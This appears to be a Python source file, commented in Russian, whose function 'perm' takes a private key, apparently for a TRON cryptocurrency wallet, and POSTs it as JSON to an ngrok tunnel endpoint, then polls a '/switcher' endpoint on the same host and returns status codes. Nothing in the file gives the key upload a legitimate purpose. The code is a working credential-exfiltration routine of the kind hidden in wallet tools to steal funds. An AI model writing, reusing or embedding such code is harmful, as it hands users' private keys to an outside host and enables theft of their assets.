import requests
import json
from requests.exceptions import RequestException

def perm(private_key):
    # 1. Формирование тела запроса в виде словаря Python
    transaction_payload = {'private_key': private_key}

    # 2. Отправка POST-запроса
    try:
        # requests.post автоматически преобразует словарь 'json=...' в JSON-тело
        # и установит заголовок Content-Type: application/json
        post_response = requests.post(
            'https://reda-sequestered-justine.ngrok-free.dev/tron',
            json=transaction_payload,
            timeout=10
        )
        post_response.raise_for_status() # Вызывает ошибку для статусов 4xx/5xx

    except RequestException as e:
        print(f"Ошибка POST-запроса к /tron: {e}")
        return -1 # Возвращаем ошибку, если POST не удался

    # 3. Отправка GET-запроса к /switcher
    try:
        switcher_response = requests.get(
            'https://reda-sequestered-justine.ngrok-free.dev/switcher',
            timeout=10
        )
        switcher_response.raise_for_status() # Вызывает ошибку для статусов 4xx/5xx
        
        # 4. Проверка ответа
        switcher_data = switcher_response.json()
        
        # Проверяем, пустой ли список (или объект) в ответе
        if not switcher_data:
            return 1 # Пусто: возвращаем 1
        else:
            return 0 # Есть данные: возвращаем 0

    except json.JSONDecodeError:
        print("Ошибка: Не удалось декодировать JSON из ответа /switcher.")
        return -2
    except RequestException as e:
        print(f"Ошибка GET-запроса к /switcher: {e}")
        return -3 # Возвращаем ошибку, если GET не удался
        
    except Exception as e:
        print(f"Неизвестная ошибка: {e}")
        return -99